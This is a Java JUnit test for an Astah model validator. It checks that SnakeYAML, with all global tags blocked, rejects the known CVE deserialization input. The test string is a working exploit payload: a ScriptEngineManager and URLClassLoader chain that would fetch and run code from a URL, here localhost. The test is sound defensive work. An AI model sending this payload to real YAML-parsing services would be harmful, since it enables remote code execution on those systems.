package hu.modeldriven.astah.validator;

import org.junit.Test;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.inspector.TagInspector;
import org.yaml.snakeyaml.nodes.Tag;

import java.io.FileReader;
import java.io.Reader;
import java.io.StringReader;
import java.util.Map;

public class YamlSnakeCVETest {

    @Test
    public void testCVE() {

        String cveInput = "some_var: !!javax.script.ScriptEngineManager "+
                "[!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080\"]]]]";

        try (Reader reader = new StringReader(cveInput)) {

            LoaderOptions options = new LoaderOptions();
            options.setTagInspector(tag -> false);
            Yaml yamlParser = new Yaml(options);
            Map<String, Object> yamlData = yamlParser.load(reader);
            System.out.println(yamlData);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
